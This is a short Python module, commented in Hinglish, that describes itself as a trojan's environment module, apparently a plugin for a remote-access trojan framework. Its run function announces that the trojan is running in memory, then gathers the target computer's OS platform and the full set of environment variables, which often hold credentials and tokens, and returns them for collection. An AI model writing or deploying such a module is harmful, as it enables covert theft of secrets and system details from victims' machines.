import os
import sys

def run(**args):
    print("[*] Trojan ka environment module successfully RAM mein chal gaya hai!")
    # Yeh target computer ke environment variables aur OS ki details nikalega
    details = f"OS Platform: {sys.platform}\n"
    details += f"User Environment: {str(os.environ)}"
    return details
